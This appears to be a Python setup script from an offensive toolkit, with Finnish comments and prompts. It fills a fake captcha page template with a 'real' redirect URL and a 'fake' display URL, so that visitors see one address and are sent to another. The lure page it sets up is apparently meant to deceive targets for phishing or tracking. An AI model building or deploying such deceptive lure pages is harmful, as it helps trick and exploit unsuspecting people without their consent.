#!/usr/bin/env python3
import os
import utils

R = '\033[31m' # punainen
G = '\033[32m' # vihreä
C = '\033[36m' # syväsininen
W = '\033[0m'  # valkoinen

oikea_forward = os.getenv('REDIRECT')
valehdellut_forward = os.getenv('DISPLAY_URL')

if oikea_forward is None:
    oikea_forward = input(f'{G}[+] {C}Syötä oikea siirto-URL :{W} ')
else:
    utils.print(f'{G}[+] {C}Oikea siirto-URL :{W} ' + oikea_forward)

if valehdellut_forward is None:
    valehdellut_forward = input(f'{G}[+] {C}Syötä vale siirto-URL :{W} ')
else:
    utils.print(f'{G}[+] {C}Vale siirto-URL :{W} ' + valehdellut_forward)

# Muokataan JS-tiedostoa
with open('template/captcha/js/main_temp.js', 'r') as location_temp:
    js_file = location_temp.read()
    updated_js_raw = js_file.replace('REDIRECT_URL', oikea_forward)

with open('template/captcha/js/main.js', 'w') as updated_js:
    updated_js.write(updated_js_raw)

# Muokataan HTML-tiedostoa
with open('template/captcha/index_temp.html', 'r') as temp_index:
    temp_index_data = temp_index.read()
    if os.getenv("DEBUG_HTTP"):
        temp_index_data = temp_index_data.replace('window.location = "https:" + restOfUrl;', '')
    upd_temp_index_raw = temp_index_data.replace('FAKE_REDIRECT_URL', valehdellut_forward)

with open('template/captcha/index.html', 'w') as updated_index:
    updated_index.write(upd_temp_index_raw)
